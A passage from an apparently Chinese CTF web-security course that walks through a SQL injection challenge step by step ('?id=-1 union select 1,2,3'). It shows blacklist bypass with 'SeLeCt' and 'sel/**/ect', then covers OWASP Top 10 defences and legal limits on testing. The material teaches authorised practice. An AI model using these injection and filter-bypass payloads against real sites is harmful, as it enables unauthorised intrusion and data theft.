内心：id 是数字，直接决定显示内容——等于在喊"我可能被拼进 SQL 了"。头号嫌疑：SQL 注入。先记下，别急着动手，把源码和响应也扫一遍（可能 flag 直接藏在注释里）。

第 2 帧 · 一次实验区分类型

内心：假设 A 数字型、B 字符型。试 ?id=2-1：若仍显示第 1 篇，说明做了算术 → 数字型、无引号；若空或报错 → 字符型。这比上来打引号信息量大。

结果：仍显示第 1 篇 → 数字型确认。

第 3 帧 · 确认漏洞真存在

动作：?id=1 and 1=2，预期页面变空；结果确实空了 → 输入被带进 SQL，注入点坐实。（数字型只是"可能"，这一步才确认。）

第 4 帧 · 走弯路 + 自我纠错

动作：急着 order by 猜列数、直接 union，结果一直报错。

内心：停。元认知自检——我是不是在瞎试？是的。我默认了"页面回显列数 = 查询列数"，没验证。反证一下：也许只回显其中一列。改用 ?id=-1 union select 1,2,3 让原查询为空，看数字出现在哪。

结果：页面显示"2" → 回显位是第 2 列。弯路就弯在"没先定位回显位就猜列数"。

第 5 帧 · 缩小战场，逐级取信息

动作：别一步想拿 flag——爆库名 → 表名 → 列名 → 数据，每级一个最小查询验证，每帧只多知道一件事。

第 6 帧 · 拿旗与复盘

动作：读出 flag。回过头记一条错题本套路：union 注入先让原查询为空、先定位回显位，再谈猜列数。

这一整段里的思维目标倒推（要拿到数据）、假设树（区分注入类型）、最小实验（一次一个变量）、元认知（第 4 帧发现自己在瞎试）、缩小战场（逐级取信息）、复盘（沉淀套路）——六种引擎协同工作。

演示二：把"卡住—破局"完整走一遍

题目：给了源码，审了半小时觉得过滤很严，找不到漏洞。下面是标准的破局流程：

【处境】审源码半小时无进展，反复看同几行。 【第1步·识别状态】元认知自检：我处于"卡住态"。诚实承认，别自欺。 【第2步·止损】停止继续读源码，按破局清单换视角。 【第3步·反证前提】问自己："我是不是默认了'过滤很严'？它真的严吗？" 【第4步·回到观察】重看过滤代码——发现它用黑名单挡了 "select"， 却没挡大小写混合 "SeLeCt" 和内联注释 "sel/**/ect"。 → 破局。原来卡的是"没被验证的假设被当成事实"。 【第5步·验证】构造混合大小写输入 → 通过。 【第6步·复盘】记一条：黑名单过滤要先测它漏了什么变体， 别凭"看着挺严"就放弃。
核心破局的关键动作不是"更努力地读源码"，而是怀疑自己的前提 + 回到观察。几乎所有卡壳，卡的都是某个没验证就被当成事实的假设。第 16 章的反证引擎和元认知，就是专治这个的。

把思维练成本能

  1. 一题多解：做出来后逼自己再找一种思路，打破"只会一条路"。
  2. 讲给别人听：讲不清的地方，就是你没真正想通的地方。
  3. 限时练习：给简单题设时间限制，训练快速观察和决策。
  4. 出题思维：试着自己出题藏一个漏洞，能出题说明真懂了机制。

读到这里，你的 Web 解题体系就完整了：第 13 章流程 → 第 14、15 章技巧 → 第 16 章思维引擎 → 第 17 章逐帧实战。剩下的就是做题——把这套思维在真实题上用起来，用一次内化一分。

第 18 章防御体系与 OWASP Top 10

会攻击更要懂防御。OWASP Top 10 是公认的 Web 安全风险排名，也是你面试必背的知识点。

18.1 OWASP Top 10（2021 版）

编号风险对应本讲义章节
A01失效的访问控制第 11 章 越权/未授权
A02加密机制失效第 1 章 HTTPS、会话安全
A03注入第 4/8/10 章 SQLi、命令注入、XXE
A04不安全设计第 11 章 业务逻辑
A05安全配置错误第 12 章 信息泄露、默认配置

你会发现：前面讲的漏洞，几乎一一对应 Top 10。这说明 CTF 考的就是真实世界最严重的问题——不是在玩文字游戏。

18.2 通用防御原则

  1. 永不信任用户输入：所有输入都当恶意，在服务端校验。
  2. 数据与代码分离：参数化查询、输出编码、模板与数据分离。
  3. 最小权限：程序、数据库账号、文件系统都只给必需的权限。
  4. 纵深防御：前端校验 + 服务端校验 + WAF + 监控，多层设防。
  5. 默认安全：关闭不必要的服务、目录、报错详情；及时打补丁。

19.1 分阶段路线

阶段重点

19.3 法律底线（必须刻在心里）

红线，绝不能碰
  • 只在授权的靶场、CTF 平台、自己的环境里练习。
  • 未经授权扫描、入侵、测试真实网站是违法的——《刑法》第 285 条（非法侵入计算机信息系统）、第 286 条（破坏计算机信息系统），《网络安全法》也有相关规定。
  • 技术本身无罪，但使用技术的人要承担责任。能力越大，越要敬畏规则。
  • 想合法检验真实水平，走正规渠道：SRC（安全应急响应中心）平台、厂商授权的渗透测试。
